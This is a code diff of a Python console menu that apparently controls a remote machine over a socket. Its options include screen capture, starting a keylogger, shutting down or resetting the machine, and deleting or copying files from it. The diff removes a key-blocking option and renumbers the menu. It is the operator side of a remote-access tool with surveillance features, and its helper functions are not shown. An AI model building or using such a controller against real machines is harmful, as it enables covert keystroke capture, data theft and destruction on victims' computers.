@@ -50,11 +50,10 @@ def main():
         print("2. Service Processing")
         print("3. Shutdown Server")
         print("4. Reset Server")
-        print("5. Server Screen Processing")
-        print("6. Block Key")
-        print("7. Start Keylogger")
-        print("8. Delete File from Server")
-        print("9. Copy File from Server")        
+        print("5. Server Screen Processing")        
+        print("6. Start Keylogger")
+        print("7. Delete File from Server")
+        print("8. Copy File from Server")        
         print("0. Exit")
         choice = input("Enter your choice: ")
 
@@ -76,17 +75,14 @@ def main():
                 print("Reset cancelled.")
         elif choice == '5':
             screen_capturing(client_socket)
-            continue
+            continue        
         elif choice == '6':
-            client_socket.sendall("BLOCK_KEYS".encode())
-            break
-        elif choice == '7':
             toggle_key_logger(client_socket)
             continue
-        elif choice == '8':
+        elif choice == '7':
             file_path = input("Enter the full path of the file to delete on server: ")
             delete_file_from_server(client_socket, file_path)
-        elif choice == '9':
+        elif choice == '8':
             copy_file_from_server(client_socket)        
         elif choice == '0':
             client_socket.close()
